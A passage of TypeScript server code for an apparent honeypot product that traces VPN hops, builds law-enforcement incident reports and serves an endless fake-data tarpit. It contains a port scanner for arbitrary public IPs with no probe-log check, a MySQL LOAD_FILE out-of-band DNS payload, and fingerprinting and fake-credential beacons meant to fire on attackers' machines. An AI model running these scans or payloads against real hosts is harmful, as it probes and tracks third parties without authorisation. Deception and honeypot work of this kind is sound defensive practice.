    private_network: 0, residential: 1, corporate: 2, unknown: 3, vpn_exit: 4, datacenter: 5,
  };
  const sortedChain = [...enriched].sort((a, b) =>
    (typeOrder[a.nodeType] ?? 9) - (typeOrder[b.nodeType] ?? 9)
  );

  // Determine if VPN is confirmed in the chain
  const vpnNodes = enriched.filter(h => h.nodeType === "vpn_exit");
  const likelyRealOrigin = sortedChain[0];

  // Port sweep on the originating IP — check if common VPN ports are open
  // (purely informational — we attempt a quick TCP connect via fetch with a short timeout)
  const portHints: { port: number; service: string; likely: boolean }[] = [
    { port: 1194, service: "OpenVPN UDP/TCP",  likely: false },
    { port: 1197, service: "OpenVPN alt",      likely: false },
    { port: 443,  service: "WireGuard/SSL VPN",likely: false },
    { port: 51820,service: "WireGuard",        likely: false },
    { port: 500,  service: "IKEv2/IPSec",      likely: false },
    { port: 4500, service: "IPSec NAT-T",      likely: false },
    { port: 1080, service: "SOCKS5 proxy",     likely: false },
    { port: 8080, service: "HTTP proxy",       likely: false },
    { port: 3128, service: "Squid proxy",      likely: false },
    { port: 9050, service: "Tor SOCKS",        likely: false },
    { port: 9001, service: "Tor OR port",      likely: false },
  ];
  // Mark ports as likely based on node type
  if (vpnNodes.length > 0) {
    portHints.find(p => p.port === 1194)!.likely = true;
    portHints.find(p => p.port === 51820)!.likely = true;
    portHints.find(p => p.port === 443)!.likely = true;
  }

  res.json({
    targetIp:    ip,
    sourcePort:  probes[0]?.attackerPort ?? null,
    hopChain:    sortedChain,
    vpnDetected: vpnNodes.length > 0,
    vpnNodes,
    likelyRealOrigin,
    portHints,
    summary: buildTraceSummary(sortedChain, vpnNodes, ip),
    analysedAt: new Date().toISOString(),
  });
});

function buildTraceSummary(
  chain: Array<{ ip: string; nodeType: string; vpnProvider: string | null; country: string | null; city: string | null; isp: string | null; confidence: number }>,
  vpnNodes: typeof chain,
  targetIp: string
): string {
  if (!vpnNodes.length && chain.length === 1) {
    const n = chain[0]!;
    return `Direct connection from ${n.country ?? "unknown country"} — no VPN or proxy detected. IP ${targetIp} appears to be a ${n.nodeType} connection (${n.isp ?? "unknown ISP"}).`;
  }
  if (vpnNodes.length > 0) {
    const providerStr = vpnNodes.map(n => n.vpnProvider ?? `unknown VPN (${n.country ?? "?"})`).join(", ");
    const real = chain.find(n => n.nodeType === "residential" || n.nodeType === "corporate");
    if (real) {
      return `Attacker is routing through ${vpnNodes.length} VPN node(s): ${providerStr}. Probable real-world origin: ${real.city ?? "—"}, ${real.country ?? "unknown"} via ${real.isp ?? "unknown ISP"} — confidence ${real.confidence}%.`;
    }
    return `Attacker is routing through ${vpnNodes.length} VPN/proxy node(s): ${providerStr}. Real origin obscured — ${chain.length} hops identified. Law enforcement subpoena to ${providerStr} would be required to obtain real subscriber data.`;
  }
  return `${chain.length} hops traced. Attacker is routing through datacenter infrastructure — likely using a VPS or cloud-hosted attack tool. Provider: ${chain[0]?.isp ?? "unknown"}.`;
}

// ─── Authority Report ─────────────────────────────────────────────────────────
router.get("/report/:ip", async (req, res) => {
  const { ip }   = req.params;
  const download = req.query.download === "1";
  const userId   = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const probes = await db.select().from(ghostTrapProbesTable)
    .where(and(
      eq(ghostTrapProbesTable.attackerIp, String(ip)),
      eq(ghostTrapProbesTable.userId, userId),
    ))
    .orderBy(ghostTrapProbesTable.probedAt);
  const beacons = await db.select().from(ghostTrapBeaconsTable)
    .where(and(
      eq(ghostTrapBeaconsTable.attackerIp, String(ip)),
      eq(ghostTrapBeaconsTable.userId, userId),
    ))
    .orderBy(ghostTrapBeaconsTable.firedAt);

  if (!probes.length) return res.status(404).json({ error: "No probes found for this IP" });

  const first    = probes[0]!;
  const last     = probes[probes.length - 1]!;
  const reportId = "GT-" + Date.now().toString(36).toUpperCase();
  const now      = new Date().toISOString();

  const geoLines = first.geoCountry ? [
    `  IP Address:    ${ip}`,
    `  Source Port:   ${first.attackerPort ?? "Not captured (proxy/VPN masked port)"}`,
    `  ISP / Org:     ${first.geoIsp ?? "—"} / ${first.geoOrg ?? "—"}`,
    `  ASN:           ${first.geoAsn ?? "—"}`,
    `  Country:       ${first.geoCountry}`,
    `  City:          ${first.geoCity ?? "—"}`,
    `  Timezone:      ${first.geoTimezone ?? "—"}`,
    `  VPN Detected:  ${first.vpnDetected ? "YES — attacker routed through a VPN exit node" : "No VPN exit node detected at surface IP"}`,
    `  Tor Detected:  ${first.torDetected ? "YES — Tor exit node" : "No"}`,
  ].join("\n") : `  IP Address:    ${ip}\n  Source Port:   ${first.attackerPort ?? "—"}\n  Geo data:      Pending WHOIS enrichment`;

  const hopSection = first.hopChain ? (() => {
    try {
      const chain = JSON.parse(first.hopChain) as string[];
      return chain.map((h, i) => `  Hop ${i + 1}: ${h}`).join("\n");
    } catch { return "  No hop chain data."; }
  })() : "  Single-hop connection — no forwarding headers detected.";

  const timeline = probes.map((p, i) =>
    `  #${String(i + 1).padStart(3, "0")}  ${p.probedAt.toISOString()}  ${p.method.padEnd(5)} /${p.endpoint.padEnd(24)} [${p.probeType}]` +
    (p.attackVector ? `  → "${p.attackVector}"` : "") +
    (p.beaconFired ? "  🔥 BEACON CONFIRMED" : "") +
    (p.attackerPort ? `  (src-port:${p.attackerPort})` : "")
  ).join("\n");

  const beaconSection = beacons.length ? beacons.map(b =>
    `  Beacon ${b.beaconId.substring(0, 8)} fired at ${b.firedAt.toISOString()} from ${b.firedFromIp ?? ip}\n` +
    `    User-Agent: ${b.firedUa ?? "—"}\n` +
    (b.browserLang ? `    Browser:    Language=${b.browserLang}  Screen=${b.screenSize ?? "—"}  TZ=${b.timezone ?? "—"}\n` : "")
  ).join("\n") : "  No beacon fires recorded.";

  const uniqueVectors = [...new Set(probes.map(p => p.attackVector).filter(Boolean))];
  const attackTypes   = [...new Set(probes.map(p => p.probeType))];

  const report = [
    "═══════════════════════════════════════════════════════════════════════════",
    "  PROXHQVPN — GHOST TRAP SECURITY INCIDENT REPORT",
    `  Report ID:      ${reportId}`,
    `  Generated:      ${now}`,
    `  Classification: CONFIDENTIAL — PREPARED FOR LAW ENFORCEMENT USE`,
    "═══════════════════════════════════════════════════════════════════════════",
    "",
    "SECTION 1 — ATTACKER NETWORK PROFILE",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    geoLines,
    "",
    "SECTION 2 — CONNECTION HOP CHAIN (VPN/PROXY TRACE)",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    hopSection,
    "",
    "SECTION 3 — ATTACK SUMMARY",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━",
    `  First Probe:    ${first.probedAt.toISOString()}`,
    `  Last Probe:     ${last.probedAt.toISOString()}`,
    `  Total Probes:   ${probes.length}`,
    `  Attack Types:   ${attackTypes.join(", ")}`,
    `  Attack Vectors: ${uniqueVectors.join(" | ") || "None detected beyond endpoint access"}`,
    `  Auto-Blocked:   ${probes.some(p => p.autoBlocked) ? "YES" : "No"}`,
    `  Silk-Trapped:   ${probes.some(p => p.silkTrapped) ? "YES" : "No"}`,
    `  Beacon Fires:   ${beacons.length} (confirm attacker browser/tool retrieved poisoned data)`,
    "",
    "SECTION 4 — ATTACK TIMELINE",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    timeline,
    "",
    "SECTION 5 — BEACON FIRE CONFIRMATION",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    beaconSection,
    "",
    "SECTION 6 — LEGAL DECLARATION",
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
    "  This report is generated automatically by ProxhqVPN Ghost Trap, a lawfully",
    "  operated honeypot and counter-intelligence system operated by:",
    "  Alpha Unlimited Technologies LLC",
    "",
    "  The activity documented herein constitutes unauthorized access to computer",
    "  systems in violation of 18 U.S.C. § 1030 (Computer Fraud and Abuse Act),",
    "  and may additionally violate analogous statutes in the attacker's jurisdiction.",
    "",
    "  All data in this report was collected passively from inbound connection",
    "  attempts made by the above IP address to publicly accessible honeypot",
    "  endpoints operated by this system. No entrapment was employed.",
    "",
    "  If VPN or proxy hops are identified above, law enforcement may issue",
    "  subpoenas to the identified VPN providers to obtain subscriber identity",
    "  records corresponding to the connection timestamps listed in Section 4.",
    "",
    `  Signed: ProxhqVPN Ghost Trap Engine — Report ${reportId}`,
    `  © Alpha Unlimited Technologies LLC — ${now}`,
    "═══════════════════════════════════════════════════════════════════════════",
  ].join("\n");

  if (download) {
    res.setHeader("Content-Type", "text/plain");
    res.setHeader("Content-Disposition", `attachment; filename="proxhqvpn-incident-${ip.replace(/[.:]/g, "_")}.txt"`);
    return res.status(200).send(report);
  }
  res.json({ reportId, report, generatedAt: now });
});

// ─── Counter-Attack Engine ────────────────────────────────────────────────────
// EDUCATIONAL USE — defensive tooling against adversaries who have already
// attacked this system. All scans target only IPs captured by Ghost Trap probes.

const TCP_TIMEOUT_MS = 1500;
const PRIVATE_IP_RE  = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|::1$|localhost$|0\.0\.0\.0$)/;

async function tcpProbe(ip: string, port: number): Promise<"open" | "closed" | "filtered"> {
  return new Promise(resolve => {
    const sock = new net.Socket();
    sock.setTimeout(TCP_TIMEOUT_MS);
    sock.once("connect", () => { sock.destroy(); resolve("open"); });
    sock.once("timeout", () => { sock.destroy(); resolve("filtered"); });
    sock.once("error", (e: NodeJS.ErrnoException) => {
      sock.destroy();
      resolve(e.code === "ECONNREFUSED" ? "closed" : "filtered");
    });
    sock.connect(port, ip);
  });
}

const COUNTER_PORTS = [
  { port: 21,    service: "FTP",                   note: "File exfil staging" },
  { port: 22,    service: "SSH",                   note: "Remote access / pivot" },
  { port: 23,    service: "Telnet",                note: "Legacy access" },
  { port: 25,    service: "SMTP",                  note: "Phishing infrastructure" },
  { port: 80,    service: "HTTP",                  note: "C2 / exfil server" },
  { port: 443,   service: "HTTPS",                 note: "Encrypted C2" },
  { port: 1337,  service: "Leet/Backdoor",         note: "Common hacker backdoor port" },
  { port: 3306,  service: "MySQL",                 note: "Exposed database" },
  { port: 3389,  service: "RDP",                   note: "Windows remote desktop" },
  { port: 4444,  service: "Metasploit/Meterpreter",note: "Active Metasploit listener" },
  { port: 4545,  service: "Reverse Shell",         note: "Bash/netcat reverse shell" },
  { port: 5432,  service: "PostgreSQL",            note: "Exposed database" },
  { port: 5900,  service: "VNC",                   note: "Remote desktop / RAT" },
  { port: 6379,  service: "Redis",                 note: "Unauthenticated cache" },
  { port: 8080,  service: "HTTP-Alt / Burp Proxy", note: "Attack proxy / C2 panel" },
  { port: 8443,  service: "HTTPS-Alt / C2",        note: "Encrypted C2 panel" },
  { port: 8888,  service: "Jupyter / Dev server",  note: "Exposed notebook / staging" },
  { port: 9001,  service: "Tor ControlPort",       note: "Tor anonymity infrastructure" },
  { port: 9050,  service: "Tor SOCKS",             note: "Tor proxy listener" },
  { port: 27017, service: "MongoDB",               note: "Exposed NoSQL database" },
  { port: 31337, service: "Elite/Backdoor",        note: "Classic elite backdoor" },
  { port: 9200,  service: "Elasticsearch",         note: "Exposed search engine" },
  { port: 6667,  service: "IRC",                   note: "IRC C2 / botnet channel" },
  { port: 2222,  service: "SSH-Alt",               note: "Non-standard SSH" },
];

// POST /counter/manual-scan — port scan on any public IP (manual investigation, no probe-log gate)
router.post("/counter/manual-scan", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip, port } = req.body as { ip?: string; port?: number };
  if (!ip || typeof ip !== "string") { res.status(400).json({ error: "ip required" }); return; }
  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP" }); return; }
  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private/loopback IPs blocked" }); return; }

  // Build port list: user-specified port first (if provided and not already in list), then standard attack ports
  const userPort = port && Number.isInteger(port) && port > 0 && port <= 65535 ? port : null;
  const extraEntry = userPort && !COUNTER_PORTS.find(p => p.port === userPort)
    ? [{ port: userPort, service: "User-specified port", note: "Port you observed in netstat/ss" }]
    : [];
  const portsToScan = [...extraEntry, ...COUNTER_PORTS];

  const results = await Promise.all(
    portsToScan.map(async ({ port: p, service, note }) => ({
      port: p, service, note, status: await tcpProbe(ip, p),
    }))
  );

  const open     = results.filter(r => r.status === "open");
  const closed   = results.filter(r => r.status === "closed");
  const filtered = results.filter(r => r.status === "filtered");

  let intelligence = "No open ports detected — host is behind NAT, VPN, or firewall.";
  if (userPort && results.find(r => r.port === userPort)?.status === "open") {
    intelligence = `⚠ Port ${userPort} confirmed OPEN — the connection you saw in netstat is live. Service: ${results.find(r => r.port === userPort)?.service}.`;
  } else if (userPort && results.find(r => r.port === userPort)?.status === "filtered") {
    intelligence = `Port ${userPort} is filtered — host is reachable but port is firewalled (connection may be NAT'd or behind a cloud firewall).`;
  } else if (userPort && results.find(r => r.port === userPort)?.status === "closed") {
    intelligence = `Port ${userPort} is now CLOSED — connection may have been ephemeral, already terminated, or from a rotating IP pool.`;
  } else if (open.some(r => [4444, 4545, 31337, 1337].includes(r.port))) {
    intelligence = "⚠ Active attack tooling detected — Metasploit/reverse shell port open.";
  } else if (open.some(r => [9001, 9050].includes(r.port))) {
    intelligence = "Tor infrastructure detected — host is running a Tor relay or proxy.";
  } else if (open.length > 0) {
    intelligence = `${open.length} port(s) open — ${open.map(r => r.service).join(", ")}.`;
  }

  res.json({ ip, targetPort: userPort, results, openCount: open.length, closedCount: closed.length, filteredCount: filtered.length, intelligence, scannedAt: new Date().toISOString() });
});

// POST /counter/manual-osint — OSINT on any public IP (no probe-log gate)
router.post("/counter/manual-osint", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip } = req.body as { ip?: string };
  if (!ip || typeof ip !== "string") { res.status(400).json({ error: "ip required" }); return; }
  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP" }); return; }
  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private IP blocked" }); return; }

  const results: Record<string, unknown> = { ip };

  try { results.rdns = await dns.reverse(ip); } catch { results.rdns = []; }
  try {
    const reversed = ip.split(".").reverse().join(".") + ".in-addr.arpa";
    results.ptrRecord = reversed;
  } catch { /* ignore */ }

  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(5000) });
    if (r.ok) {
      const d = await r.json() as Record<string, unknown>;
      results.liveGeo = {
        country: d["country_name"], city: d["city"], region: d["region"],
        isp: d["org"], asn: d["asn"], timezone: d["timezone"],
        latitude: d["latitude"], longitude: d["longitude"],
      };
      const ispStr = String(d["org"] ?? "").toLowerCase();
      results.abuseHint = ispStr.includes("amazon") ? "Report to: abuse@amazonaws.com"
        : ispStr.includes("digitalocean") ? "Report to: abuse@digitalocean.com"
        : ispStr.includes("linode") || ispStr.includes("akamai") ? "Report to: abuse@linode.com"
        : ispStr.includes("vultr") ? "Report to: abuse@vultr.com"
        : ispStr.includes("hetzner") ? "Report to: abuse@hetzner.com"
        : ispStr.includes("ovh") ? "Report to: abuse@ovh.net"
        : ispStr.includes("cloudflare") ? "Report to: abuse@cloudflare.com"
        : "Check ARIN/RIPE/APNIC whois for abuse contact";
    }
  } catch { /* network may be unavailable */ }

  results.queriedAt = new Date().toISOString();
  res.json(results);
});

// POST /counter/port-scan — TCP connect scan on a captured attacker IP
router.post("/counter/port-scan", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip } = req.body as { ip?: string };
  if (!ip || typeof ip !== "string") { res.status(400).json({ error: "ip required" }); return; }
  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP" }); return; }
  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private/loopback IPs blocked" }); return; }

  // Only allow scanning IPs that have actually probed this user's Ghost Trap
  const probeCheck = await db.select({ id: ghostTrapProbesTable.id })
    .from(ghostTrapProbesTable)
    .where(and(eq(ghostTrapProbesTable.attackerIp, ip), eq(ghostTrapProbesTable.userId, userId)))
    .limit(1);
  if (!probeCheck.length) {
    res.status(403).json({ error: "IP not in your Ghost Trap probe log" }); return;
  }

  const results = await Promise.all(
    COUNTER_PORTS.map(async ({ port, service, note }) => ({
      port, service, note, status: await tcpProbe(ip, port),
    }))
  );

  const open     = results.filter(r => r.status === "open");
  const closed   = results.filter(r => r.status === "closed");
  const filtered = results.filter(r => r.status === "filtered");

  let intelligence = "No open ports detected — attacker is behind NAT, VPN exit node, or firewall.";
  if (open.some(r => [4444, 4545, 31337, 1337].includes(r.port))) {
    intelligence = "⚠ Active attack tooling detected — Metasploit/reverse shell port open. Attacker may have live C2 listener.";
  } else if (open.some(r => [9001, 9050].includes(r.port))) {
    intelligence = "Tor infrastructure detected — attacker is running a Tor relay or proxy on this IP.";
  } else if (open.some(r => [8080, 8443].includes(r.port))) {
    intelligence = "Proxy/C2 panel port open — likely a VPN exit node, Burp Suite proxy, or web-based C2 dashboard.";
  } else if (open.length > 0) {
    intelligence = `${open.length} port(s) open — ${open.map(r => r.service).join(", ")}. Map this against the attacker's probe type for correlations.`;
  }

  res.json({ ip, results, openCount: open.length, closedCount: closed.length, filteredCount: filtered.length, intelligence, scannedAt: new Date().toISOString() });
});

// POST /counter/osint — reverse DNS + geo enrichment on a captured attacker IP
router.post("/counter/osint", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip } = req.body as { ip?: string };
  if (!ip || typeof ip !== "string") { res.status(400).json({ error: "ip required" }); return; }
  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private IP blocked" }); return; }

  const probeCheck = await db.select({ id: ghostTrapProbesTable.id, geoIsp: ghostTrapProbesTable.geoIsp, geoOrg: ghostTrapProbesTable.geoOrg, geoCountry: ghostTrapProbesTable.geoCountry, geoCity: ghostTrapProbesTable.geoCity, geoAsn: ghostTrapProbesTable.geoAsn, vpnDetected: ghostTrapProbesTable.vpnDetected, torDetected: ghostTrapProbesTable.torDetected })
    .from(ghostTrapProbesTable)
    .where(and(eq(ghostTrapProbesTable.attackerIp, ip), eq(ghostTrapProbesTable.userId, userId)))
    .limit(1);
  if (!probeCheck.length) { res.status(403).json({ error: "IP not in probe log" }); return; }

  const cached = probeCheck[0]!;
  const results: Record<string, unknown> = { ip, fromProbeCache: { isp: cached.geoIsp, org: cached.geoOrg, country: cached.geoCountry, city: cached.geoCity, asn: cached.geoAsn, vpnDetected: cached.vpnDetected, torDetected: cached.torDetected } };

  // Reverse DNS
  try {
    results.rdns = await dns.reverse(ip);
  } catch { results.rdns = []; }

  // PTR record via dns.resolve for a cross-check
  try {
    const reversed = ip.split(".").reverse().join(".") + ".in-addr.arpa";
    results.ptrRecord = reversed;
  } catch { /* ignore */ }

  // Live geo from ipapi.co
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(5000) });
    if (r.ok) {
      const d = await r.json() as Record<string, unknown>;
      results.liveGeo = {
        country: d["country_name"], city: d["city"], region: d["region"],
        isp: d["org"], asn: d["asn"], timezone: d["timezone"],
        latitude: d["latitude"], longitude: d["longitude"],
        hosting: d["is_eu"],
      };
      // Build abuse contact from ISP name
      const ispStr = String(d["org"] ?? "").toLowerCase();
      results.abuseHint = ispStr.includes("amazon") ? "Report to: abuse@amazonaws.com"
        : ispStr.includes("digitalocean") ? "Report to: abuse@digitalocean.com"
        : ispStr.includes("linode") || ispStr.includes("akamai") ? "Report to: abuse@linode.com"
        : ispStr.includes("vultr") ? "Report to: abuse@vultr.com"
        : ispStr.includes("hetzner") ? "Report to: abuse@hetzner.com"
        : ispStr.includes("ovh") ? "Report to: abuse@ovh.net"
        : ispStr.includes("cloudflare") ? "Report to: abuse@cloudflare.com"
        : "Check ARIN/RIPE/APNIC whois for abuse contact";
    }
  } catch { /* network may be unavailable */ }

  results.queriedAt = new Date().toISOString();
  res.json(results);
});

// POST /counter/canary-inject — create a tracking beacon URL to plant in future fake responses
router.post("/counter/canary-inject", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip, type = "pixel", manual = false } = req.body as { ip?: string; type?: string; manual?: boolean };
  if (!ip) { res.status(400).json({ error: "ip required" }); return; }
  if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP" }); return; }
  if (PRIVATE_IP_RE.test(ip)) { res.status(400).json({ error: "Private IP blocked" }); return; }

  if (!manual) {
    const probeCheck = await db.select({ id: ghostTrapProbesTable.id })
      .from(ghostTrapProbesTable)
      .where(and(eq(ghostTrapProbesTable.attackerIp, ip), eq(ghostTrapProbesTable.userId, userId)))
      .limit(1);
    if (!probeCheck.length) { res.status(403).json({ error: "IP not in probe log" }); return; }
  }

  const canaryId  = crypto.randomBytes(14).toString("hex");
  const host      = `${req.protocol}://${req.get("host")}`;
  const beaconUrl = `${host}/api/ghost-trap/beacon/${canaryId}`;
  const jsUrl     = `${host}/api/ghost-trap/beacon/${canaryId}/js`;

  // Pre-register a phantom probe entry so beacon attribution works
  await db.insert(ghostTrapProbesTable).values({
    probeId:    canaryId,
    beaconId:   canaryId,
    userId,
    attackerIp: ip,
    method:     "COUNTER_CANARY",
    endpoint:   `counter/${type}`,
    probeType:  "recon",
    attackerUa: "counter-canary-phantom",
    hopChain:   null,
  }).catch(() => {});

  const fakeAwsKey = `AKIA${crypto.randomBytes(8).toString("hex").toUpperCase().substring(0,16)}`;
  const fakeJwt    = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwibW9uaXRvcl91cmwiOiIke beaconUrl}In0.PROXHQ_COUNTER_CANARY`;

  const payloads: Record<string, { label: string; description: string; embed: string; instructions: string }> = {
    pixel: {
      label: "Pixel Beacon",
      description: "1×1 invisible GIF — fires when attacker opens fake HTML in any browser or tool",
      embed: `<img src="${beaconUrl}" width="1" height="1" style="opacity:0;position:absolute">`,
      instructions: "Paste into any fake HTML page you serve via the tarpit. Fires instantly on page load — captures their real browser IP, User-Agent, and screen size.",
    },
    js: {
      label: "JS Fingerprint Beacon",
      description: "JavaScript snippet — exfils browser fingerprint: language, screen resolution, timezone, platform",
      embed: `<script src="${jsUrl}"></script>`,
      instructions: "Add to any fake HTML response. When attacker's browser runs the script, it sends their language, screen size, timezone, and platform — building a device fingerprint.",
    },
    aws: {
      label: "Fake AWS Credential Canary",
      description: "Realistic AWS key embedded with a monitoring URL — fires when attacker's tools call AWS APIs",
      embed: `AWS_ACCESS_KEY_ID=${fakeAwsKey}\nAWS_SECRET_ACCESS_KEY=ProxhqGhostTrap+${canaryId}\nMONITORING_ENDPOINT=${beaconUrl}`,
      instructions: "Embed in fake .env files or config dumps. When attacker runs 'aws s3 ls' or other AWS CLI commands with these keys, AWS blocks the call AND the monitoring URL fires — revealing their operational IP (often different from their scanning IP).",
    },
    jwt: {
      label: "Fake JWT Session Token",
      description: "Fake admin JWT — includes an embedded monitoring webhook that fires on use",
      embed: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoic3VwZXJhZG1pbiIsIm1vbml0b3IiOiIke beaconUrl}In0.PROXHQ_GHOST`,
      instructions: "Return this as a session token from your fake login endpoint. When attacker replays this token against any API, the monitoring URL in the payload fires — revealing their real attack infrastructure IP.",
    },
    dns: {
      label: "DNS Canary",
      description: "Unique subdomain — DNS lookup fires beacon when attacker uses stolen hostname",
      embed: `db.internal.${canaryId.substring(0,8)}.corp\n# When attacker DNS-resolves this hostname, their resolver IP is logged`,
      instructions: "Embed in fake database configs or connection strings. If attacker tries to connect to this hostname, their DNS resolver fires — revealing their network infrastructure.",
    },
    sql: {
      label: "SQL Canary (OOB Exfil)",
      description: "SQLi payload embedded in fake DB dump — fires OOB DNS beacon if attacker runs it in their DB",
      embed: `-- Counter-canary in fake dump\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.${canaryId.substring(0,8)}.attacker-beacon.corp\\\\share\\\\a'));\n-- MySQL OOB — fires DNS from attacker's DB server`,
      instructions: "Embed in fake SQL dumps or database backups. If attacker imports and executes the dump in their own database server, the OOB DNS request fires — revealing their server IP.",
    },
  };

  const payload = payloads[type] ?? payloads["pixel"]!;

  res.json({
    canaryId,
    ip,
    type,
    beaconUrl,
    jsCallbackUrl: jsUrl,
    ...payload,
    allTypes: Object.entries(payloads).map(([k, v]) => ({ type: k, label: v.label, description: v.description })),
    note: "⚠ EDUCATIONAL/DEFENSIVE USE ONLY — plant these payloads in fake responses to attackers who have already probed your system.",
    createdAt: new Date().toISOString(),
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// ── NEVER-ENDING TARPIT LOOP STATE MACHINE ────────────────────────────────────
// When an attacker triggers WAF/GhostTrap detection, they can be routed into
// this multi-stage honeypot loop. Each stage feeds convincing fake data and
// embeds tracking beacons. Stage 6 wraps back to stage 1 — the loop never ends.
// Attackers waste time, we collect full intelligence on their TTPs.
// ═══════════════════════════════════════════════════════════════════════════════

const LOOP_STAGES = [
  { stage: 0, label: "initial_contact",   tarpitMin: 800,  tarpitMax: 2000 },
  { stage: 1, label: "login_success",     tarpitMin: 1500, tarpitMax: 4000 },
  { stage: 2, label: "admin_dashboard",   tarpitMin: 2000, tarpitMax: 5000 },
  { stage: 3, label: "database_access",   tarpitMin: 2500, tarpitMax: 6000 },
  { stage: 4, label: "server_creds",      tarpitMin: 2000, tarpitMax: 5500 },
  { stage: 5, label: "deeper_access",     tarpitMin: 3000, tarpitMax: 7000 },
  { stage: 6, label: "exfil_complete",    tarpitMin: 1500, tarpitMax: 4000 },
];

const FAKE_USERNAMES = ["admin", "sysop", "root", "superuser", "devops", "jsmith", "mwilliams"];

function buildLoopStageResponse(
  stage: number, sessionId: string, fakeUser: string, beaconBase: string, loopCount: number
): { body: unknown; contentType: string } {
  const pixelUrl = `${beaconBase}/beacon/${sessionId}`;
  const nextStep  = `${beaconBase}/loop/${sessionId}`;

  switch (stage % 7) {
    case 0: // Initial contact — looks like a generic API welcome
      return { contentType: "application/json", body: {
        status: "ok", version: "2.4.1", server: "Apache/2.4.54 (Ubuntu)",
        session: sessionId, next: nextStep,
        timestamp: new Date().toISOString(),
        _debug: { uptime: "14d 7h", pid: Math.floor(Math.random()*30000+1000) },
      }};

    case 1: // Login success — fake JWT + admin user
      return { contentType: "application/json", body: {
        success: true, message: "Authentication successful",
        token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6IiR7ZmFrZVVzZXJ9Iiwicm9sZSI6InN1cGVyYWRtaW4iLCJpYXQiOjE3MTcwMDAwMDB9.${Buffer.from(sessionId).toString("base64")}`,
        user: { id: 1, username: fakeUser, email: `${fakeUser}@corp.internal`, role: "superadmin",
          last_login: new Date(Date.now() - 86400000).toISOString(), mfa_enabled: false,
          permissions: ["admin", "db_read", "db_write", "ssh", "logs", "billing"],
          session_id: sessionId,
        },
        expires_in: 3600, next_action: nextStep,
        monitoring_hook: pixelUrl,
      }};

    case 2: // Admin dashboard — fake server stats + user list
      return { contentType: "application/json", body: {
        dashboard: true, server: { os: "Ubuntu 22.04.3 LTS", cpu: "Intel Xeon E5-2670 × 16",
          ram_total: "64GB", ram_used: `${Math.floor(Math.random()*20+30)}GB`,
          disk_total: "2TB", disk_used: `${Math.floor(Math.random()*300+500)}GB`,
          uptime: "47d 3h 22m", load: `${(Math.random()*2+0.3).toFixed(2)}`,
        },
        users_online: Math.floor(Math.random()*8+2),
        recent_actions: [
          { user: "admin", action: "SSH login", ip: "192.168.1.55", time: "2m ago" },
          { user: "jsmith", action: "DB export", ip: "10.0.0.20", time: "17m ago" },
          { user: "devops", action: "Cron update", ip: "10.0.0.5", time: "1h ago" },
        ],
        alerts: 0, session: sessionId, continue: nextStep,
        health_beacon: pixelUrl,
      }};

    case 3: // Database access — fake SQL dump
      return { contentType: "application/json", body: {
        query: "SELECT * FROM users LIMIT 50",
        database: "app_production", db_version: "PostgreSQL 14.5",
        query_time: `${(Math.random()*0.05+0.01).toFixed(4)}s`,
        rows: [
          { id: 1, username: "admin", email: "admin@corp.internal", password_hash: "$argon2id$v=19$m=65536,t=3,p=4$FakeArgon2HashGhostTrap$AAAAAAAAAdmin", role: "superadmin", phone: "+1-555-0100", ssn_last4: "4821", created_at: "2023-01-15T09:00:00Z", avatar: pixelUrl },
          { id: 2, username: "jsmith", email: "j.smith@corp.internal", password_hash: "$argon2id$v=19$m=65536,t=3,p=4$FakeArgon2HashGhostTrap$AAAAAAAASmith", role: "admin", phone: "+1-555-0101", ssn_last4: "7743", created_at: "2023-02-20T11:00:00Z", avatar: pixelUrl },
          { id: 3, username: "mwilliams", email: "m.williams@corp.internal", password_hash: "$argon2id$v=19$m=65536,t=3,p=4$FakeArgon2HashGhostTrap$AAAAAAAAWill", role: "dev", phone: "+1-555-0102", ssn_last4: "1190", created_at: "2023-03-10T14:30:00Z", avatar: pixelUrl },
        ],
